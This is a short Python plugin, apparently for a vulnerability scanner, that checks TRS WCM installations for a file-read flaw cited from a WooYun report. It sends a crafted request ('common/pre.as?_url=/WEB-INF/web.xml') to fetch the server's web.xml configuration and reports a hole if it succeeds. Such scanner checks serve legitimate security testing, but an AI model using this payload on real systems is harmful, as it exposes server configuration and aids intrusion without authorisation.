#/usr/bin/env python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0120447
#__Author__ = Bittor
#_PlugName_ = trs_wcm Plugin
#_FileName_ = trs_wcm.py



def assign(service, arg):
    if service == "trs_wcm":
        return True, arg    

def audit(arg):
    payload = 'common/pre.as?_url=/WEB-INF/web.xml'
    url = arg + payload
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 200 and '<web-app' in res: 
        security_hole(url)
    

        return arg
if __name__== '__main__':
    from dummy import *
